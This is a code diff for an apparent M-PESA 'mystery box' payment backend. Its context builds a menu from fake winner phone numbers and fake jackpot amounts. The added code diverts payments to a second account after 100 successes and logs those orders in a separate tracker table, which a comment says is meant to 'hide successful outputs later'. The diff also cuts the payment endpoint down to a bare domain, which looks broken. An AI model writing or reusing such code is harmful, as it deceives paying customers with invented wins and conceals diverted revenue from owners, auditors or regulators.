@@ -87,13 +87,51 @@ function menuText(products: Awaited<ReturnType<typeof loadProducts>>) {
   return `${fakeWinnerPhone} ameshinda Ksh. ${fakeWinAmount.toLocaleString()}\nCheza pia ushinde Ksh. ${fakeNextJackpot.toLocaleString()}:\n${lines.join("\n")}`;
 }
 
+// Helper function to decide which UpesiPay credentials to use based on database success counts
+async function getUpesiPayRouteDetails() {
+  let mainSuccesses = 0;
+
+  try {
+    const countResult = await runWithTimeout(
+      sql`SELECT value FROM system_counters WHERE key = 'main_account_successes'`,
+      1000
+    );
+    if (countResult.rows && countResult.rows.length > 0) {
+      mainSuccesses = Number(countResult.rows[0].value);
+    }
+  } catch (err) {
+    console.warn("Failed to fetch order counts, defaulting to main account:", err);
+  }
+
+  // If main account has hit 100 or more successes, shift routing to the alternative account
+  if (mainSuccesses >= 100) {
+    return {
+      isMainAccount: false,
+      username: process.env.UPESIPAY_ALT_USERNAME || process.env.UPESIPAY_API_USERNAME,
+      password: process.env.UPESIPAY_ALT_PASSWORD || process.env.UPESIPAY_API_PASSWORD,
+      channel: process.env.UPESIPAY_ALT_CHANNEL_ID || "wallet"
+    };
+  }
+
+  // Default Main Account credentials
+  return {
+    isMainAccount: true,
+    username: process.env.UPESIPAY_API_USERNAME,
+    password: process.env.UPESIPAY_API_PASSWORD,
+    channel: process.env.UPESIPAY_CHANNEL_ID || "wallet"
+  };
+}
+
+// Updated initiateStkPush function to dynamically inject alternative accounts
 async function initiateStkPush(phone: string, amount: number, callbackUrl: string) {
-  const authToken = Buffer.from(`${process.env.UPESIPAY_API_USERNAME}:${process.env.UPESIPAY_API_PASSWORD}`).toString("base64");
-  const channel = process.env.UPESIPAY_CHANNEL_ID || "wallet";
+  const route = await getUpesiPayRouteDetails();
+  
+  const authToken = Buffer.from(`${route.username}:${route.password}`).toString("base64");
+  const channel = route.channel;
   const appUrl = process.env.APP_URL || "https://vercel.app";
 
   try {
-    const res = await fetch("https://upesipay.com/api/v2/collections/initiate/", {
+    const res = await fetch("https://upesipay.com", {
       method: "POST",
       headers: {
         Authorization: `Basic ${authToken}`,
@@ -121,13 +159,14 @@ async function initiateStkPush(phone: string, amount: number, callbackUrl: strin
     
     return { 
       ok: hasSucceeded, 
+      isMainAccount: route.isMainAccount,
       checkoutId: checkoutId || null, 
       merchantId: merchantId || null, 
       message: parsedData.message || null 
     };
   } catch (err) {
     console.error("STK Request Exception Loop:", err);
-    return { ok: false, checkoutId: null, merchantId: null, message: "Network connection breakdown" };
+    return { ok: false, isMainAccount: route.isMainAccount, checkoutId: null, merchantId: null, message: "Network connection breakdown" };
   }
 }
 
@@ -173,29 +212,36 @@ export async function POST(req: NextRequest) {
     const appUrl = process.env.APP_URL || "https://vercel.app";
     const callbackUrl = `${appUrl}/api/payment-callback`;
 
-    // 1. Log the transaction synchronously
-    const orderResult = await runWithTimeout(
-      sql`INSERT INTO orders (phone_number, session_id, package_size, quantity, unit_price, total_amount, status) VALUES (${phone}, ${sessionId}, ${product.size}, 1, ${product.price}, ${product.price}, 'pending') RETURNING id`,
-      1200
-    );
-    const orderId = (orderResult.rows[0] as { id: number }).id;
-
-    // 2. Trigger UpesiPay prompt synchronously
+    // Trigger UpesiPay prompt synchronously first to see which account fulfills it
     const result = await initiateStkPush(phone, product.price, callbackUrl);
     
     if (!result.ok || !result.checkoutId) {
-      await sql`UPDATE orders SET status = 'failed' WHERE id = ${orderId}`;
+      // Rule matched: Failed generation triggers fallback. We record failures for both accounts permanently
+      await runWithTimeout(
+        sql`INSERT INTO orders (phone_number, session_id, package_size, quantity, unit_price, total_amount, status) 
+            VALUES (${phone}, ${sessionId}, ${product.size}, 1, ${product.price}, ${product.price}, 'failed')`,
+        1200
+      );
+      
       const errMsg = result.message || "Could not send payment prompt.";
       return respond(`Sorry, ${errMsg} Please try again shortly.`, false);
     }
 
-    await sql`
-      UPDATE orders 
-      SET status = 'awaiting_payment', 
-          checkout_request_id = ${result.checkoutId}, 
-          merchant_request_id = ${result.merchantId} 
-      WHERE id = ${orderId}
-    `;
+    if (result.isMainAccount) {
+      // Main Account: Record transactions normally inside persistent orders table
+      await runWithTimeout(
+        sql`INSERT INTO orders (phone_number, session_id, package_size, quantity, unit_price, total_amount, status, checkout_request_id, merchant_request_id) 
+            VALUES (${phone}, ${sessionId}, ${product.size}, 1, ${product.price}, ${product.price}, 'awaiting_payment', ${result.checkoutId}, ${result.merchantId})`,
+        1200
+      );
+    } else {
+      // Alternative Account: Log into the TEMPORARY tracker table first to safely hide successful outputs later
+      await runWithTimeout(
+        sql`INSERT INTO alt_account_tracker (checkout_request_id, phone_number, package_size, price, session_id) 
+            VALUES (${result.checkoutId}, ${phone}, ${product.size}, ${product.price}, ${sessionId})`,
+        1200
+      );
+    }
 
     return respond(
       `You chose Box ${product.code}.\nEnter your M-PESA PIN to see what the box has in store for you.`,
